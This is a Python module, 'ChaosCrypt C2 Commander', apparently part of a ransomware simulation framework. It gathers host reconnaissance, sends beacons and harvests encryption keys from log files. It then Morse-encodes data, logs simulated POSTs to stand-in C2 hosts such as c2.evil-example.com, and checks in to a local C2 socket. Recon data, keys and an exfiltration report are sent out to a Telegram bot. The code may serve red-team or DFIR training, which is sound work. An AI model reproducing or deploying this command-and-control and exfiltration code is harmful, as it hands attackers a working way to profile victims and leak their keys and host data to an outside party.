import os
import sys
import json
import time
import socket
import platform
import hashlib
import base64
import argparse
import datetime

current_dir = os.path.dirname(os.path.abspath(__file__))
parent_dir = os.path.dirname(current_dir)
if parent_dir not in sys.path:
    sys.path.append(parent_dir)

from chaoscrypt.settings import (
    ROOT_DIR, LOG_DIR, LOGFILES, ASSETS_DIR,
    TELEGRAM_AUTO_NOTIFY, TELEGRAM_TOKEN, TELEGRAM_CHAT_ID,
    SHOW_TARGET_DIR, STEALTH_TARGET_DIR,
    SAFE_MODE, DFIR_MODE,
    ENCRYPTED_SUFFIX, METADATA_SUFFIX,
    IMG_LOGO_SYSTEM, IMG_SUCCESS
)
from chaoscrypt.logbook import LogBook

try:
    from chaoscrypt.telegram_notify import send_message, send_document, send_photo
except ImportError:
    send_message = None
    send_document = None
    send_photo = None

C2_PHASE = "c2"
C2_SERVER_PORT = 5654
BEACON_INTERVAL_SEC = 8
BEACON_COUNT = 3
EXFIL_REPORT_PATH = os.path.join(LOG_DIR, "c2_exfil_report.json")
PCAP_FOLDER = os.path.join(LOG_DIR, "net_pcap")

MORSE_CODE = {
    'A': '.-',    'B': '-...',  'C': '-.-.',  'D': '-..',   'E': '.',
    'F': '..-.',  'G': '--.',   'H': '....',  'I': '..',    'J': '.---',
    'K': '-.-',   'L': '.-..',  'M': '--',    'N': '-.',    'O': '---',
    'P': '.--.',  'Q': '--.-',  'R': '.-.',   'S': '...',   'T': '-',
    'U': '..-',   'V': '...-',  'W': '.--',   'X': '-..-',  'Y': '-.--',
    'Z': '--..',  '0': '-----', '1': '.----', '2': '..---', '3': '...--',
    '4': '....-', '5': '.....', '6': '-....', '7': '--...', '8': '---..',
    '9': '----.', ' ': '/',     '.': '.-.-.-', ',': '--..--',
}


class C2Commander:
    def __init__(self):
        self.logger = LogBook(phase=C2_PHASE)
        self.session_id = hashlib.md5(
            f"{socket.gethostname()}-{os.getpid()}-{time.time()}".encode()
        ).hexdigest()[:12]
        self.collected_keys = []
        self.recon_data = {}
        print(f"[C2] Commander initialized. Session: {self.session_id}")
        self.logger.log_event("info", "C2 Commander initialized", metadata={
            "session_id": self.session_id,
            "hostname": socket.gethostname(),
            "user": os.getenv("USERNAME") or os.getenv("USER") or "unknown",
            "safe_mode": SAFE_MODE
        })

    def system_recon(self):
        print("[C2] ─── System Recon ───")
        self.recon_data = {
            "hostname": socket.gethostname(),
            "platform": platform.system(),
            "release": platform.release(),
            "version": platform.version(),
            "arch": platform.machine(),
            "processor": platform.processor()[:60],
            "python": platform.python_version(),
            "user": os.getenv("USERNAME") or os.getenv("USER") or "unknown",
            "cwd": os.getcwd(),
            "pid": os.getpid(),
            "home": os.path.expanduser("~"),
            "temp": os.environ.get("TEMP") or os.environ.get("TMPDIR") or "/tmp",
        }

        try:
            self.recon_data["local_ip"] = socket.gethostbyname(socket.gethostname())
        except Exception:
            self.recon_data["local_ip"] = "unknown"
        try:
            self.recon_data["fqdn"] = socket.getfqdn()
        except Exception:
            self.recon_data["fqdn"] = "unknown"

        for tname, tdir in [("show", SHOW_TARGET_DIR), ("stealth", STEALTH_TARGET_DIR)]:
            if os.path.isdir(tdir):
                files = os.listdir(tdir)
                self.recon_data[f"{tname}_total_files"] = len(files)
                self.recon_data[f"{tname}_encrypted"] = sum(1 for f in files if f.endswith(ENCRYPTED_SUFFIX))
                self.recon_data[f"{tname}_meta_files"] = sum(1 for f in files if f.endswith(METADATA_SUFFIX))
            else:
                self.recon_data[f"{tname}_total_files"] = 0

        self.logger.log_event("exfiltration", "System recon complete",
                              metadata=self.recon_data, tag="recon")

        if send_message:
            msg = (
                f"🕵️ <b>C2 System Recon</b>\n"
                f"<code>Session:  {self.session_id}</code>\n"
                f"<code>Host:     {self.recon_data['hostname']}</code>\n"
                f"<code>OS:       {self.recon_data['platform']} {self.recon_data['release']}</code>\n"
                f"<code>Arch:     {self.recon_data['arch']}</code>\n"
                f"<code>User:     {self.recon_data['user']}</code>\n"
                f"<code>IP:       {self.recon_data['local_ip']}</code>\n"
                f"<code>Python:   {self.recon_data['python']}</code>\n"
                f"<code>Show:     {self.recon_data.get('show_total_files',0)} files ({self.recon_data.get('show_encrypted',0)} enc)</code>\n"
                f"<code>Stealth:  {self.recon_data.get('stealth_total_files',0)} files ({self.recon_data.get('stealth_encrypted',0)} enc)</code>"
            )
            send_message(msg, parse_mode="HTML", async_mode=False)

        print(f"[C2] Recon done. Host={self.recon_data['hostname']} IP={self.recon_data['local_ip']}")
        return self.recon_data

    def send_beacon(self, count=BEACON_COUNT, interval=BEACON_INTERVAL_SEC):
        print(f"[C2] ─── Beacon (count={count}, interval={interval}s) ───")
        self.logger.log_event("network", "Beacon cycle started", metadata={
            "count": count, "interval": interval, "session_id": self.session_id
        })

        for i in range(1, count + 1):
            ts = datetime.datetime.now(datetime.timezone.utc).isoformat(timespec="seconds")
            beacon = {
                "type": "beacon", "session": self.session_id,
                "seq": i, "host": socket.gethostname(), "ts": ts
            }
            self.logger.log_event("network", f"Beacon #{i}/{count}", metadata=beacon)

            if send_message:
                send_message(
                    f"📡 <b>Beacon #{i}/{count}</b> | "
                    f"<code>{self.session_id}</code> | "
                    f"<code>{socket.gethostname()}</code> | "
                    f"<code>{ts}</code>",
                    parse_mode="HTML", async_mode=False
                )
            print(f"[C2] Beacon #{i}/{count}")
            if i < count:
                time.sleep(interval)

        self.logger.log_event("network", "Beacon cycle complete",
                              metadata={"total": count, "session_id": self.session_id})
        print(f"[C2] Beacon cycle complete ({count} sent).")

    def exfil_keys(self):
        print("[C2] ─── Key Exfiltration ───")
        self.collected_keys = []

        for phase_name in ('show', 'stealth'):
            log_path = LOGFILES.get(phase_name)
            if not log_path or not os.path.exists(log_path):
                continue
            try:
                with open(log_path, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if not line:
                            continue
                        try:
                            ev = json.loads(line)
                            meta = ev.get('metadata') or {}
                            key = meta.get('key') or meta.get('encryption_key')
                            if key:
                                entry = {
                                    "phase": phase_name,
                                    "key": key,
                                    "file": meta.get('file', meta.get('path', 'unknown')),
                                    "ts": ev.get('ts', ''),
                                    "event_type": ev.get('event_type', '')
                                }
                                if not any(e['key'] == key and e['phase'] == phase_name
                                           for e in self.collected_keys):
                                    self.collected_keys.append(entry)
                        except json.JSONDecodeError:
                            continue
            except Exception as e:
                print(f"[C2] Error reading {log_path}: {e}")

        unique_keys = list({k['key'] for k in self.collected_keys})
        print(f"[C2] Found {len(self.collected_keys)} key entries ({len(unique_keys)} unique).")

        self.logger.log_event("exfiltration", "Key exfiltration complete", metadata={
            "entries": len(self.collected_keys),
            "unique": len(unique_keys),
            "keys_preview": [k[:16] + "..." for k in unique_keys[:5]],
            "session_id": self.session_id
        }, tag="critical")

        if send_message and self.collected_keys:
            keys_lines = []
            for k in self.collected_keys[:10]:
                kv = k['key'][:32] + "..." if len(k['key']) > 32 else k['key']
                keys_lines.append(f"  🔑 <code>{k['phase']}: {kv}</code>")
            send_message(
                f"🚨 <b>C2 Key Exfiltration</b>\n"
                f"<code>Session: {self.session_id}</code>\n"
                f"<code>Found: {len(self.collected_keys)} ({len(unique_keys)} unique)</code>\n\n"
                + "\n".join(keys_lines),
                parse_mode="HTML", async_mode=False
            )

        return self.collected_keys

    def morse_encode(self, text):
        return ' '.join(MORSE_CODE.get(c.upper(), '?') for c in text)

    def morse_exfil(self, data_text=None):
        payload = data_text or self.session_id
        morse = self.morse_encode(payload)
        print(f"[C2] ─── Morse Exfil ───")
        print(f"[C2] '{payload}' -> '{morse[:80]}...'")

        self.logger.log_event("exfiltration", "Morse exfil", metadata={
            "original": payload, "morse": morse[:200],
            "encoding": "ITU_MORSE", "session_id": self.session_id
        }, tag="stealth_exfil")

        if send_message:
            send_message(
                f"📻 <b>C2 Morse Exfil</b>\n"
                f"<code>Payload: {payload[:60]}</code>\n"
                f"<code>Morse:   {morse[:120]}</code>",
                parse_mode="HTML", async_mode=False
            )
        return morse

    def http_exfil_sim(self):
        print("[C2] ─── HTTP Exfil Simulation ───")
        payload = {
            "session_id": self.session_id,
            "hostname": socket.gethostname(),
            "recon": {k: v for k, v in self.recon_data.items()
                      if k in ('hostname', 'platform', 'user', 'local_ip', 'arch')},
            "keys_count": len(self.collected_keys),
            "ts": datetime.datetime.now(datetime.timezone.utc).isoformat()
        }
        payload_json = json.dumps(payload, ensure_ascii=False)
        payload_b64 = base64.b64encode(payload_json.encode()).decode()

        fake_c2_endpoints = [
            "https://c2.evil-example.com/api/beacon",
            "https://update-check.example.net/telemetry",
            "https://cdn-assets.example.org/upload",
        ]

        for endpoint in fake_c2_endpoints:
            self.logger.log_event("exfiltration", "HTTP POST exfil (SIMULATED)", metadata={
                "endpoint": endpoint,
                "payload_bytes": len(payload_json),
                "b64_chars": len(payload_b64),
                "method": "POST",
                "safe_mode": SAFE_MODE,
                "session_id": self.session_id
            }, tag="http_exfil")
            print(f"[C2] POST -> {endpoint} ({len(payload_json)}B) [SIMULATED]")

        if send_message:
            send_message(
                f"🌐 <b>C2 HTTP Exfil (Simulated)</b>\n"
                f"<code>Endpoints: {len(fake_c2_endpoints)}</code>\n"
                f"<code>Payload:   {len(payload_json)} bytes</code>\n"
                f"<code>B64:       {len(payload_b64)} chars</code>\n"
                f"<code>SAFE_MODE: {SAFE_MODE}</code>",
                parse_mode="HTML", async_mode=False
            )
        return payload

    def connect_local_c2(self, message=None):
        print(f"[C2] ─── Local C2 Connect (port {C2_SERVER_PORT}) ───")
        payload = message or f"C2_CHECKIN|{self.session_id}|{socket.gethostname()}|{time.time()}"

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect(("127.0.0.1", C2_SERVER_PORT))
            sock.sendall(payload.encode())
            response = sock.recv(4096).decode(errors='ignore')
            sock.close()

            self.logger.log_event("network", "Local C2 connection OK", metadata={
                "port": C2_SERVER_PORT, "sent": payload[:100],
                "response": response.strip(), "session_id": self.session_id
            })

            os.makedirs(PCAP_FOLDER, exist_ok=True)
            pcap_path = os.path.join(PCAP_FOLDER, f"c2_session_{self.session_id}.pcap")
            with open(pcap_path, 'ab') as f:
                ts_str = datetime.datetime.now(datetime.timezone.utc).isoformat()
                f.write(f"[{ts_str}] SEND: {payload}\n".encode())
                f.write(f"[{ts_str}] RECV: {response}\n".encode())

            print(f"[C2] Connected. Response: {response.strip()}")
            return response.strip()

        except ConnectionRefusedError:
            msg = f"[C2] Connection refused on port {C2_SERVER_PORT} (C2 server not running)"
            print(msg)
            self.logger.log_event("network", msg, metadata={
                "port": C2_SERVER_PORT, "session_id": self.session_id
            })
            return None
        except Exception as e:
            print(f"[C2] Local C2 connect error: {e}")
            self.logger.log_event("error", f"Local C2 connect failed: {e}", metadata={
                "port": C2_SERVER_PORT, "session_id": self.session_id
            })
            return None

    def generate_exfil_report(self):
        print("[C2] ─── Exfil Report ───")
        report = {
            "session_id": self.session_id,
            "generated_at": datetime.datetime.now(datetime.timezone.utc).isoformat(),
            "hostname": socket.gethostname(),
            "recon": self.recon_data,
            "keys_exfiltrated": self.collected_keys,
            "unique_keys": list({k['key'] for k in self.collected_keys}),
            "beacons_sent": BEACON_COUNT,
            "safe_mode": SAFE_MODE,
            "dfir_mode": DFIR_MODE
        }

        os.makedirs(LOG_DIR, exist_ok=True)
        with open(EXFIL_REPORT_PATH, 'w', encoding='utf-8') as f:
            json.dump(report, f, ensure_ascii=False, indent=2)

        self.logger.log_event("exfiltration", "Exfil report generated", metadata={
            "path": EXFIL_REPORT_PATH,
            "keys_count": len(self.collected_keys),
            "session_id": self.session_id
        })

        if send_document and os.path.isfile(EXFIL_REPORT_PATH):
            status = send_document(
                EXFIL_REPORT_PATH,
                caption=f"🚨 C2 Exfil Report | Session: {self.session_id}",
                async_mode=False
            )
            print(f"[C2] TG report: {status}")

        print(f"[C2] Report saved: {EXFIL_REPORT_PATH}")
        return EXFIL_REPORT_PATH

    def run_full_pipeline(self):
        print("\n" + "=" * 60)
        print("*** ChaosCrypt C2 Commander — Full Pipeline ***")
        print("=" * 60)

        self.logger.log_event("info", "C2 Full Pipeline started", metadata={
            "session_id": self.session_id,
            "safe_mode": SAFE_MODE, "dfir_mode": DFIR_MODE
        })

        if send_message:
            send_message(
                f"🎯 <b>C2 Commander: Pipeline Started</b>\n"
                f"<code>Session: {self.session_id}</code>\n"
                f"<code>SAFE_MODE: {SAFE_MODE}</code>",
                parse_mode="HTML", async_mode=False
            )

        print()
        self.system_recon()
        time.sleep(1)

        print()
        self.send_beacon(count=BEACON_COUNT, interval=BEACON_INTERVAL_SEC)
        time.sleep(1)

        print()
        self.exfil_keys()
        time.sleep(1)

        print()
        if self.collected_keys:
            self.morse_exfil(self.collected_keys[0]['key'][:16])
        else:
            self.morse_exfil(self.session_id)
        time.sleep(1)

        print()
        self.http_exfil_sim()
        time.sleep(1)

        print()
        self.connect_local_c2()
        time.sleep(1)

        print()
        report_path = self.generate_exfil_report()

        # Finish
        self.logger.log_event("finish", "C2 Full Pipeline complete", metadata={
            "session_id": self.session_id,
            "keys_found": len(self.collected_keys),
            "report": report_path
        })

        if send_message:
            send_message(
                f"✅ <b>C2 Commander: Complete</b>\n"
                f"<code>Session: {self.session_id}</code>\n"
                f"<code>Keys: {len(self.collected_keys)}</code>\n"
                f"<code>Report: {os.path.basename(report_path)}</code>",
                parse_mode="HTML", async_mode=False
            )

        print("\n" + "=" * 60)
        print(f"[C2] Pipeline complete. Session: {self.session_id}")
        print(f"[C2] Report: {report_path}")
        print("=" * 60)
        self.logger.close()
        return report_path

def main():
    parser = argparse.ArgumentParser(description="ChaosCrypt C2 Commander")
    parser.add_argument('--beacon', action='store_true', help="Beacon only")
    parser.add_argument('--recon', action='store_true', help="Recon only")
    parser.add_argument('--exfil-keys', action='store_true', help="Exfil keys only")
    parser.add_argument('--morse', type=str, help="Morse encode text")
    parser.add_argument('--connect', action='store_true', help="Connect to local C2")
    parser.add_argument('--report', action='store_true', help="Generate report only")
    args = parser.parse_args()

    c2 = C2Commander()

    if args.beacon:
        c2.send_beacon()
    elif args.recon:
        c2.system_recon()
    elif args.exfil_keys:
        c2.exfil_keys()
    elif args.morse:
        c2.morse_exfil(args.morse)
    elif args.connect:
        c2.connect_local_c2()
    elif args.report:
        c2.system_recon()
        c2.exfil_keys()
        c2.generate_exfil_report()
    else:
        c2.run_full_pipeline()

if __name__ == "__main__":
    main()